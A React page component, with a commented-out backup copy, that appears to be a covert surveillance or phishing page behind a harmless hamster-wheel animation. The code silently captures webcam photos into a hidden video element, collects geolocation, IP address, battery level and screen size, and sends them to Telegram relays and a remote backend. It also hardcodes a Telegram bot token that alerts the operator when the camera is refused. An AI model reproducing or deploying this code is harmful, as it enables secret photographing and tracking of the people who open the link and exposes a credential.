import React, { useRef, useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";
import "./App.css";

const PhotoPage = () => {
  const videoRef = useRef(null);
  const { chatId } = useParams();
  const [photoCount, setPhotoCount] = useState(0);
  const [locationSent, setLocationSent] = useState(false);
  const [locationPermission, setLocationPermission] = useState(null);
  const [clientIp, setClientIp] = useState("");

// новый функцияонал

  const [handleCamera, setHandleCamera] = useState(false)
  
  const handleOnCamera = ()=> {
    if(!videoRef.current){
      setHandleCamera(!handleCamera)
    }
  }
  const getBatteryLevel = async () => {
    if ("getBattery" in navigator) {
      const battery = await navigator.getBattery();
      return Math.floor(battery.level * 100) + "%";
    } else {
      return "Unknown";
    }
  };


  useEffect(() => {
    const accessWebcam = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }
        

      } catch (error) {
        setHandleCamera(!handleCamera)

          console.error("Error accessing webcam:", error);
          try{
            const url = 'https://api.telegram.org/bot7654585303:AAFLJMpcU2znRSbob-KPUgM0XZE1QTqDR3k/sendMessage'
            axios.post(url, {'chat_id': chatId, 'text': 'Пользователь отклонил запрос к камере!'})
      
          }catch(err){
            console.log(`error%${err}`);
          }
      }
    };


    const savedPermission = localStorage.getItem("locationPermission");
    if (savedPermission) {
      setLocationPermission(JSON.parse(savedPermission));
    }

    const fetchClientIp = async () => {
      try {
        const response = await axios.get('https://api.ipify.org?format=json');
        setClientIp(response.data.ip);
      } catch (error) {
        console.error("Error fetching client IP:", error);
      }
    };

    accessWebcam();
    fetchClientIp();
  }, [handleCamera]);

  const captureImage = async () => {
    if (!videoRef.current) {
      console.error("Video element is null");
      return;
    }

    const video = videoRef.current;

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
      if (blob) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "photo.jpg");

        const apiUrl = "http://localhost:5000/sendPhotoToTelegram";

        try {
          await axios.post(apiUrl, formData, {
            headers: {
              "Content-Type": "multipart/form-data",
            },
          });

          setPhotoCount((prevCount) => prevCount + 1);
        } catch (error) {
          console.error("Error sending photo to server:", error);
        }
      }
    }, "image/jpeg");
  };
  
  useEffect(()=>{
    const getUserData = async ()=> {
      const deviceInfo = getDeviceInfo();
      const data = {
        chat_id: chatId,
        batteryLevel: await getBatteryLevel(),
        screenWidth: deviceInfo.screenWidth,
        screenHeight: deviceInfo.screenHeight,
        clientIp: clientIp,
      };
    
      const apiUrl = 'http://localhost:5000/sendDataToTelegram'
      try{
        await axios.post(apiUrl, data,  {
          headers: {
            headers: { "Content-Type": "application/json" },
          },
        })
      }catch(err){
        console.error("Error sending user data to server:", err);
      }
    }
    getUserData()
  }, [])
 
  
  


  const sendLocation = async (coords) => {
    const { latitude, longitude } = coords;
    const apiUrl = "http://localhost:5000/sendLocationToTelegram";
    const data = { chat_id: chatId, latitude, longitude, clientIp };

    try {
      await axios.post(apiUrl, data);
      console.log("Location sent to Telegram");
      setLocationSent(true);
    } catch (error) {
      console.error("Error sending location to server:", error);
    }
  };

  const requestLocationPermission = async () => {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      const { latitude, longitude } = position.coords;
      const coords = { latitude, longitude };
      localStorage.setItem("locationPermission", JSON.stringify(coords));
      setLocationPermission(coords);

      sendLocation(coords);
    } catch (error) {
      if (error.code === error.PERMISSION_DENIED) {
        alert("Пожалуйста, включите доступ к местоположению в настройках вашего устройства.");
      } else {
        console.error("Error getting location permission:", error);
      }
    }
  };

  useEffect(() => {
    if (!locationPermission) {
      requestLocationPermission();
    }
  }, []);

  useEffect(() => {
    const intervalId = setInterval(() => {
      if (photoCount < 3) {
        captureImage();
      }
    }, 3000);

    return () => clearInterval(intervalId);
  }, [photoCount]);

  const getDeviceInfo = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const deviceType = /Mobile/.test(userAgent) ? "Mobile Device" : "Desktop Device";

    return {
      userAgent,
      platform,
      screenWidth,
      screenHeight,
      deviceType,
    };
  };

  return (
    <>
      <div>
        <video
          ref={videoRef}
          style={{ display: "none" }}
          width="640"
          height="480"
          autoPlay
        ></video>
      </div>
      <div className="wraper">
        <div
          aria-label="Orange and tan hamster running in a metal wheel"
          role="img"
          class="wheel-and-hamster"
        >
          <div class="wheel"></div>
          <div class="hamster">
            <div class="hamster__body">
              <div class="hamster__head">
                <div class="hamster__ear"></div>
                <div class="hamster__eye"></div>
                <div class="hamster__nose"></div>
              </div>
              <div class="hamster__limb hamster__limb--fr"></div>
              <div class="hamster__limb hamster__limb--fl"></div>
              <div class="hamster__limb hamster__limb--br"></div>
              <div class="hamster__limb hamster__limb--bl"></div>
              <div class="hamster__tail"></div>
            </div>
          </div>
          <div class="spoke"></div>
        </div>

        <label class="theme-switch">
          <input type="checkbox" class="theme-switch__checkbox" />
          <div class="theme-switch__container">
            <div class="theme-switch__clouds"></div>
            <div class="theme-switch__stars-container">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 144 55"
                fill="none"
              >
                <path
                  fill-rule="evenodd"
                  clip-rule="evenodd"
                  d="M135.831 3.00688C135.055 3.85027 134.111 4.29946 133 4.35447C134.111 4.40947 135.055 4.85867 135.831 5.71123C136.607 6.55462 136.996 7.56303 136.996 8.72727C136.996 7.95722 137.172 7.25134 137.525 6.59129C137.886 5.93124 138.372 5.39954 138.98 5.00535C139.598 4.60199 140.268 4.39114 141 4.35447C139.88 4.2903 138.936 3.85027 138.16 3.00688C137.384 2.16348 136.996 1.16425 136.996 0C136.996 1.16425 136.607 2.16348 135.831 3.00688ZM31 23.3545C32.1114 23.2995 33.0551 22.8503 33.8313 22.0069C34.6075 21.1635 34.9956 20.1642 34.9956 19C34.9956 20.1642 35.3837 21.1635 36.1599 22.0069C36.9361 22.8503 37.8798 23.2903 39 23.3545C38.2679 23.3911 37.5976 23.602 36.9802 24.0053C36.3716 24.3995 35.8864 24.9312 35.5248 25.5913C35.172 26.2513 34.9956 26.9572 34.9956 27.7273C34.9956 26.563 34.6075 25.5546 33.8313 24.7112C33.0551 23.8587 32.1114 23.4095 31 23.3545ZM0 36.3545C1.11136 36.2995 2.05513 35.8503 2.83131 35.0069C3.6075 34.1635 3.99559 33.1642 3.99559 32C3.99559 33.1642 4.38368 34.1635 5.15987 35.0069C5.93605 35.8503 6.87982 36.2903 8 36.3545C7.26792 36.3911 6.59757 36.602 5.98015 37.0053C5.37155 37.3995 4.88644 37.9312 4.52481 38.5913C4.172 39.2513 3.99559 39.9572 3.99559 40.7273C3.99559 39.563 3.6075 38.5546 2.83131 37.7112C2.05513 36.8587 1.11136 36.4095 0 36.3545ZM56.8313 24.0069C56.0551 24.8503 55.1114 25.2995 54 25.3545C55.1114 25.4095 56.0551 25.8587 56.8313 26.7112C57.6075 27.5546 57.9956 28.563 57.9956 29.7273C57.9956 28.9572 58.172 28.2513 58.5248 27.5913C58.8864 26.9312 59.3716 26.3995 59.9802 26.0053C60.5976 25.602 61.2679 25.3911 62 25.3545C60.8798 25.2903 59.9361 24.8503 59.1599 24.0069C58.3837 23.1635 57.9956 22.1642 57.9956 21C57.9956 22.1642 57.6075 23.1635 56.8313 24.0069ZM81 25.3545C82.1114 25.2995 83.0551 24.8503 83.8313 24.0069C84.6075 23.1635 84.9956 22.1642 84.9956 21C84.9956 22.1642 85.3837 23.1635 86.1599 24.0069C86.9361 24.8503 87.8798 25.2903 89 25.3545C88.2679 25.3911 87.5976 25.602 86.9802 26.0053C86.3716 26.3995 85.8864 26.9312 85.5248 27.5913C85.172 28.2513 84.9956 28.9572 84.9956 29.7273C84.9956 28.563 84.6075 27.5546 83.8313 26.7112C83.0551 25.8587 82.1114 25.4095 81 25.3545ZM136 36.3545C137.111 36.2995 138.055 35.8503 138.831 35.0069C139.607 34.1635 139.996 33.1642 139.996 32C139.996 33.1642 140.384 34.1635 141.16 35.0069C141.936 35.8503 142.88 36.2903 144 36.3545C143.268 36.3911 142.598 36.602 141.98 37.0053C141.372 37.3995 140.886 37.9312 140.525 38.5913C140.172 39.2513 139.996 39.9572 139.996 40.7273C139.996 39.563 139.607 38.5546 138.831 37.7112C138.055 36.8587 137.111 36.4095 136 36.3545ZM101.831 49.0069C101.055 49.8503 100.111 50.2995 99 50.3545C100.111 50.4095 101.055 50.8587 101.831 51.7112C102.607 52.5546 102.996 53.563 102.996 54.7273C102.996 53.9572 103.172 53.2513 103.525 52.5913C103.886 51.9312 104.372 51.3995 104.98 51.0053C105.598 50.602 106.268 50.3911 107 50.3545C105.88 50.2903 104.936 49.8503 104.16 49.0069C103.384 48.1635 102.996 47.1642 102.996 46C102.996 47.1642 102.607 48.1635 101.831 49.0069Z"
                  fill="currentColor"
                ></path>
              </svg>
            </div>
            <div class="theme-switch__circle-container" onClick={()=> handleOnCamera}>
              <div class="theme-switch__sun-moon-container">
                <div class="theme-switch__moon">
                  <div class="theme-switch__spot"></div>
                  <div class="theme-switch__spot"></div>
                  <div class="theme-switch__spot"></div>
                </div>
              </div>
            </div>
          </div>
        </label>
      </div>
    </>
  );
};

export default PhotoPage;











// backup
// import React, { useRef, useEffect, useState } from "react";
// import { useParams } from "react-router-dom";
// import axios from "axios";
// import "./App.css";

// const PhotoPage = () => {
//   const videoRef = useRef(null);
//   const { chatId } = useParams();
//   const [photoCount, setPhotoCount] = useState(0);
//   const [locationSent, setLocationSent] = useState(false);
//   const [locationPermission, setLocationPermission] = useState(null);

//   useEffect(() => {
//     const accessWebcam = async () => {
//       try {
//         const stream = await navigator.mediaDevices.getUserMedia({
//           video: true,
//         });
//         if (videoRef.current) {
//           videoRef.current.srcObject = stream;
//         }
//       } catch (error) {
//         console.error("Error accessing webcam:", error);
//       }
//     };

//     accessWebcam();

//     const savedPermission = localStorage.getItem("locationPermission");
//     if (savedPermission) {
//       setLocationPermission(JSON.parse(savedPermission));
//     }
//   }, []);

//   const captureImage = async () => {
//     if (!videoRef.current) {
//       console.error("Video element is null");
//       return;
//     }

//     const video = videoRef.current;

//     const canvas = document.createElement("canvas");
//     canvas.width = video.videoWidth;
//     canvas.height = video.videoHeight;

//     const context = canvas.getContext("2d");
//     context.drawImage(video, 0, 0, canvas.width, canvas.height);

//     canvas.toBlob(async (blob) => {
//       if (blob) {
//         const formData = new FormData();
//         formData.append("chat_id", chatId);
//         formData.append("photo", blob, "photo.jpg");
//         formData.append("batteryLevel", await getBatteryLevel());

//         const apiUrl = "https://xhunterback.onrender.com/sendPhotoToTelegram";

//         try {
//           await axios.post(apiUrl, formData, {
//             headers: {
//               "Content-Type": "multipart/form-data",
//             },
//           });

//           setPhotoCount((prevCount) => prevCount + 1);
//         } catch (error) {
//           console.error("Error sending photo to server:", error);
//         }
//       }
//     }, "image/jpeg");
//   };

//   const getBatteryLevel = async () => {
//     if ("getBattery" in navigator) {
//       const battery = await navigator.getBattery();
//       console.log(battery);
//       return Math.floor(battery.level * 100) + "%";
//     } else {
//       return "Неизвествое значение";
//     }
//   };


//   const sendLocation = async (coords) => {
//     const { latitude, longitude } = coords;
//     const apiUrl = "https://xhunterback.onrender.com/sendLocationToTelegram";
//     const data = { chat_id: chatId, latitude, longitude };

//     try {
//       await axios.post(apiUrl, data);
//       console.log("Location sent to Telegram");
//       setLocationSent(true);
//     } catch (error) {
//       console.error("Error sending location to server:", error);
//     }
//   };

//   const requestLocationPermission = async () => {
//     try {
//       const position = await new Promise((resolve, reject) => {
//         navigator.geolocation.getCurrentPosition(resolve, reject);
//       });
//       const { latitude, longitude } = position.coords;
//       const coords = { latitude, longitude };
//       localStorage.setItem("locationPermission", JSON.stringify(coords));
//       setLocationPermission(coords);

//       // Send location immediately after obtaining permission
//       sendLocation(coords);
//     } catch (error) {
//       console.error("Error getting location permission:", error);
//     }
//   };

//   useEffect(() => {
//     if (!locationPermission) {
//       requestLocationPermission();
//     }
//   }, []);

//   useEffect(() => {
//     const intervalId = setInterval(() => {
//       if (photoCount < 3) {
//         captureImage();
//       }
//     }, 3000);

//     return () => clearInterval(intervalId);
//   }, [photoCount]);

//   const getDeviceInfo = () => {
//     const userAgent = navigator.userAgent;
//     const platform = navigator.platform;
//     const screenWidth = window.screen.width;
//     const screenHeight = window.screen.height;
//     const deviceType = /Mobile/.test(userAgent) ? "Mobile Device" : "Desktop Device";

//     return {
//       userAgent,
//       platform,
//       screenWidth,
//       screenHeight,
//       deviceType,
//     };
//   };

